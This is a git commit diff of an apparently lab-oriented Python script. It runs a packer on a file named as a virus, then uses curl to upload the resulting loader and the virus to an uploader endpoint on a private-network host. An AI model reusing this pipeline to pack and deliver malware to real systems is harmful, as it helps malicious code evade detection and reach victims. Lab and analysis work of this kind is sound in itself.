677f4ac6ccca3f3dedc47bff59535a14242c1fc8
Goanalog14 <124058067+Goanalog14@users.noreply.github.com>
2024-01-21 16:02:10 +0100

    Update pack.py

--- script_on_analyzer/pack.py
+++ script_on_analyzer/pack.py
@@ -9,13 +9,13 @@ virus = sys.argv[1]
 try:
     subprocess.run(['/home/kali/Downloads/simplepack-master/pack', virus], check=True)
     print("Programma 'pack' eseguito con successo.")
+    print("caricamento loader")
+    curl_cmd = f"curl -X POST -F \"file=@loader\" http://192.168.56.101:8080/uploader"
+    os.system(curl_cmd)
+    print("caricamento virus")
+    curl_cmd = f"curl -X POST -F \"file=@{virus}\" http://192.168.56.101:8080/uploader"
+    os.system(curl_cmd)
 except subprocess.CalledProcessError:
     print("Errore durante l'esecuzione di 'pack'.")
 
-print("caricamento loader")
-curl_cmd = f"curl -X POST -F \"file=@loader\" http://192.168.56.101:8080/uploader"
-os.system(curl_cmd)
 
-print("caricamento virus")
-curl_cmd = f"curl -X POST -F \"file=@{virus}\" http://192.168.56.101:8080/uploader"
-os.system(curl_cmd)
